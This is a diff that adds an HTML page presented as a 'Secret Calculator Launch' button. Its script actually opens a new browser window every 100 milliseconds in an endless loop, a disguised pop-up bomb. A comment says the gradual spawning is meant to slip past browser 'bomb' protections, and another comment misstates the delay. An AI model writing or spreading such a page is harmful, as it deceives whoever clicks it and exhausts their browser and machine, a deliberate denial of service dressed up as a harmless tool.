@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Super Secret Windows or Mac Ultimate Calculator Spawner :)</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px; background: #1a1a1a; color: white; }
+        .status { margin: 20px; font-size: 1.2rem; color: #00ff00; }
+        button { padding: 20px 40px; font-size: 24px; cursor: pointer; background: #e74c3c; color: white; border: none; border-radius: 12px; transition: 0.3s; }
+        button:hover { background: #c0392b; transform: scale(1.05); }
+    </style>
+</head>
+<body>
+    <h1>Secret Calculator Launch</h1>
+    <p>Will open: <strong>ULTIIMATE CALCULATOR</strong></p>
+    <div class="status" id="counter">Windows Spawned: 0</div>
+    
+    <button onclick="startInfiniteLoop()">Press to open the ULTIMATE CALCULATOR</button>
+
+    <script>
+        let count = 0;
+        
+        function startInfiniteLoop() {
+            // Incremental spawning to bypass immediate "bomb" triggers
+            spawnWindow();
+        }
+
+        function spawnWindow() {
+            count++;
+            document.getElementById('counter').innerText = "Windows Spawned: " + count;
+
+            // window.open parameters for 2026 browsers
+            // Using unique names ('win' + count) ensures they open as separate windows
+            window.open('https://www.desmos.com/scientific', 'win' + count, 'width=800,height=600,left=' + (count*10) + ',top=' + (count*10));
+
+            // Recursion: Calls itself again after 1000ms (1 second)
+            // Adjust to 100 or 500 for a faster, more intense stress test
+            setTimeout(spawnWindow, 100); 
+        }
+    </script>
+</body>
+</html>
